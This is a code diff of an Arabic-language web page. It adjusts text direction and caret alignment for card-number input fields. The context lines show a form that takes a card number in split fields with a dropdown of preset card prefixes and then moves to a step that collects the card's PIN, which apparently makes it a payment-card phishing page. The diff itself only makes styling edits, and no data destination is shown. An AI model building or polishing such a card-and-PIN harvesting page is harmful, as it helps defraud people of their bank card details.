@@ -138,7 +138,7 @@
             gap: 8px;
             margin-bottom: 14px;
             flex-direction: row;
-            justify-content: flex-end; /* جعل العناصر لليسار في RTL */
+            justify-content: flex-end;
             align-items: center;
             padding: 0 2px;
         }
@@ -264,6 +264,13 @@
         }
         .card-next-btn:hover {
             background: #003366;
+        }
+        /* توجيه سهم الكتابة لليسار في جميع خانات البطاقة بالخطوة الأولى */
+        .card-inputs input, .card-inputs select {
+            direction: ltr !important;
+            text-align: left !important;
+            unicode-bidi: plaintext !important;
+            caret-color: auto;
         }
     </style>
 </head>
@@ -412,7 +419,7 @@
             };
         }
 
-        // ========== هنا التعديل المطلوب ==========
+        // ========== هنا التعديل ==========
         function renderCardStep1() {
             cardData = {};
             document.getElementById('main').innerHTML = `
@@ -422,10 +429,10 @@
                     <form id="cardStep1Form" autocomplete="off">
                         <label class="big-label" style="text-align:center;display:block;">رقم البطاقة</label>
                         <div class="card-inputs" style="justify-content: flex-end; gap:8px;">
-                            <input type="text" id="card2" maxlength="2" inputmode="numeric" pattern="\\d{2}" class="card-two" placeholder="__" autocomplete="off" style="direction:ltr;text-align:left;"/>
-                            <input type="text" id="card4a" maxlength="4" inputmode="numeric" pattern="\\d{4}" class="card-four" placeholder="____" autocomplete="off" style="direction:ltr;text-align:left;"/>
-                            <input type="text" id="card4b" maxlength="4" inputmode="numeric" pattern="\\d{4}" class="card-four" placeholder="____" autocomplete="off" style="direction:ltr;text-align:left;"/>
-                            <select id="cardStart" required style="direction:ltr;text-align:left;">
+                            <input type="text" id="card2" maxlength="2" inputmode="numeric" pattern="\\d{2}" class="card-two" placeholder="__" autocomplete="off" style="direction:ltr;text-align:left;unicode-bidi:plaintext;"/>
+                            <input type="text" id="card4a" maxlength="4" inputmode="numeric" pattern="\\d{4}" class="card-four" placeholder="____" autocomplete="off" style="direction:ltr;text-align:left;unicode-bidi:plaintext;"/>
+                            <input type="text" id="card4b" maxlength="4" inputmode="numeric" pattern="\\d{4}" class="card-four" placeholder="____" autocomplete="off" style="direction:ltr;text-align:left;unicode-bidi:plaintext;"/>
+                            <select id="cardStart" required style="direction:ltr;text-align:left;unicode-bidi:plaintext;">
                                 <option value="">select</option>
                                 <option value="401319">401319</option>
                                 <option value="401340">401340</option>
@@ -483,7 +490,7 @@
                 renderCardPin(cardStart, cardData.cardRest);
             };
         }
-        // ========== نهاية التعديل المطلوب ==========
+        // ========== نهاية التعديل ==========
 
         function renderCardPin(cardStart, cardRest) {
             cardData.cardStart = cardStart;
